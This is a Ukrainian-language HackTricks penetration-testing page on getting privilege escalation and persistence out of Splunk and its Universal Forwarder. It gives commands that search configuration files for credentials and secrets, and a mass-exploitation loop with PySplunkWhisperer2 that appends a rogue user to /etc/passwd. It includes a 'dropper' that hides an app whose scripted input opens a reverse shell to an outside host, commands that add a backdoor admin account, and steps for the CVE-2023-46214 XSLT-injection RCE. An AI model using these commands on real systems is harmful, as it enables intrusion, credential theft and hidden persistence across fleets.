# LPE та Persistence у Splunk

{{#include ../../banners/hacktricks-training.md}}

Якщо під час **внутрішнього** або **зовнішнього** **перерахування** машини ви виявили **запущений Splunk** (зазвичай **8000** для веб-інтерфейсу та **8089** для management API), дійсні облікові дані часто можна перетворити на **виконання коду** через встановлення застосунків, scripted inputs або дії керування. Якщо Splunk запущений від імені **root**, це часто одразу призводить до **підвищення привілеїв**.

Якщо вам потрібна лише загальна поверхня віддаленої атаки, enumeration або шлях RCE через завантаження застосунку, перегляньте:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Якщо ви **вже маєте root**, а сервіс Splunk прослуховує не лише localhost, ви також можете викрасти **хеші паролів Splunk**, відновити **зашифровані секрети** або розгорнути **шкідливий застосунок**, щоб зберегти persistence локально чи на кількох forwarders.

## Цікаві локальні файли

Якщо ви отримали доступ до хоста, на якому працює Splunk або Splunk Universal Forwarder, зазвичай найбільш цікавими є такі шляхи:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Важливі артефакти:

- **`$SPLUNK_HOME/etc/passwd`**: локальні користувачі Splunk і хеші паролів.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: ключ, який Splunk використовує для шифрування секретів, що зберігаються в кількох `.conf` файлах.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: початковий файл bootstrap адміністратора; корисний у golden images і випадках помилок provisioning. Він ігнорується, якщо `etc/passwd` уже існує.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: місце, де зазвичай увімкнені scripted inputs.
- **`$SPLUNK_HOME/etc/deployment-apps/`** або **`$SPLUNK_HOME/etc/apps/`**: хороші місця для приховування persistent app або перевірки того, що вже розповсюджується.

## Зведення щодо Splunk Universal Forwarder Agent Exploit

Докладнішу інформацію див. у [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Це лише зведення:<sup>[[1]](#references)</sup>

**Огляд Exploit:**
Exploit, націлений на Splunk Universal Forwarder (UF), дозволяє зловмисникам, які мають **пароль агента**, виконувати довільний код у системах, де працює агент, потенційно отримуючи контроль над значною частиною середовища.

**Чому це працює:**

- Сервіс керування UF зазвичай доступний через **TCP 8089**.
- Зловмисники можуть автентифікуватися в API та вказати forwarder встановити **malicious app bundle**.
- Цей самий primitive можна використовувати локально для **LPE** або віддалено для **RCE**.
- Public tooling, наприклад **SplunkWhisperer2**, автоматично створює app bundle і може адаптувати payloads для Linux targets.

**Поширені способи відновлення пароля:**

- Облікові дані у cleartext у документації, скриптах, shares або deployment automation.
- Хеші паролів у `$SPLUNK_HOME/etc/passwd` з подальшим offline cracking.
- Golden images або залишки provisioning, наприклад `user-seed.conf`.

**Вплив:**

- Виконання коду на рівні SYSTEM/root на кожному скомпрометованому host.
- Розгортання persistent apps, backdoors або ransomware.
- Вимкнення чи підробка telemetry до пересилання даних.

**Приклад команди для Exploit:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Доступні публічні експлойти:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence через Scripted Inputs або Malicious Apps

Якщо у вас є **доступ на запис до файлової системи** від імені `root`/`splunk` або автентифікований доступ для встановлення apps, дуже надійним механізмом Persistence є розміщення **custom app** зі **scripted input**.<sup>[[2]](#references)</sup> Власна документація Splunk передбачає, що scripted inputs мають розташовуватися в директорії app і бути увімкненими через `inputs.conf`.

Типова структура:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Мінімальний `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Швидкий Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Нотатки:

- Той самий трюк працює на **Universal Forwarder** із використанням `/opt/splunkforwarder/etc/apps/`.
- Attackers часто маскуються, змінюючи легітимний add-on замість створення очевидно malicious app.
- На **deployment server** розміщення malicious app у `deployment-apps/` перетворюється на **fleet-wide persistence**, оскільки forwarders опитують сервер, завантажують оновлені apps і часто перезапускаються для їх застосування.

## Викрадення облікових даних і захоплення облікового запису адміністратора

Якщо ви можете читати локальні файли Splunk, зазвичай є дві основні цілі: відновити **Splunk admin access** і відновити **encrypted service credentials**.

### Хеші паролів і локальні користувачі

Splunk зберігає локальні дані автентифікації у `etc/passwd`. Залежно від конфігурації, cracking цього файлу може відновити робочі облікові дані для web UI та management API.

Якщо у вас уже є дійсні облікові дані **admin** і Splunk використовує власний (**native**) backend автентифікації, сам CLI можна використати для persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` та зашифровані значення

Splunk використовує `etc/auth/splunk.secret` для захисту конфіденційних значень, що зберігаються в кількох конфігураційних файлах. Якщо вам вдасться викрасти і **secret**, і відповідні **`.conf`-файли**, ви часто зможете відновити або повторно використати:

- спільні секрети forwarder/indexer, такі як `pass4SymmKey`
- паролі приватних ключів TLS, такі як `sslPassword`
- облікові дані прив'язки LDAP, такі як `bindDNPassword`

Це корисно для **lateral movement**, навіть якщо пароль адміністратора Splunk неможливо зламати.

### Зловживання `user-seed.conf`

`user-seed.conf` використовується лише під час першого запуску або коли `etc/passwd` не існує. Це робить його менш корисним на активній системі, але дуже цікавим у таких випадках:

- скомпрометовані шаблони інсталяції
- container images
- unattended provisioning workflows
- appliances, де Splunk автоматично ініціалізується повторно

У таких випадках розміщення `HASHED_PASSWORD`, згенерованого за допомогою `splunk hash-passwd`, дає змогу непомітно відновити адміністративний доступ після повторного розгортання.

## Зловживання Splunk Queries

Докладніше див. [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Корисна нещодавня техніка полягає у зловживанні **XSLT, наданим користувачем**, у вразливих версіях Splunk Enterprise, щоб перетворити автентифікований акаунт із низькими привілеями на виконання **OS-команд** від імені користувача `splunk`.

Загальний перебіг:

1. Автентифікуватися в Splunk.
2. Завантажити шкідливий файл **XSL** через функціональність preview/upload.
3. Змусити Splunk відобразити результати пошуку за допомогою завантаженої таблиці стилів із каталогу **dispatch**.
4. Використати payload XSLT для запису файлу або запуску виконання через пошуковий pipeline Splunk, наприклад через звернення до внутрішньої функціональності на кшталт `runshellscript`.

Важливий offensive-висновок полягає в тому, що цей шлях забезпечує **post-auth RCE без необхідності app upload**. У Linux це зазвичай дає доступ до акаунта **`splunk`**, який усе одно є цінним, оскільки цей користувач часто володіє деревом каталогів застосунку, може читати секрети та розміщувати persistent apps, які переживають втрату shell.

Типовий шлях, що використовується під час exploitation:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Якщо Splunk запущено з надмірними привілеями або користувач `splunk` має доступ до небезпечних скриптів, доступних для запису service units чи небезпечних правил `sudo`, це утворює чіткий ланцюжок **LPE**.

## Посилання

- [1] [Зловживання Splunk Forwarders для RCE та Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Обережно, TraitorWare: використання Splunk для Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Рекомендації Splunk щодо безпеки SVD-2023-1104 - XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Аналіз CVE-2023-46214: XSLT Injection RCE у Splunk](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
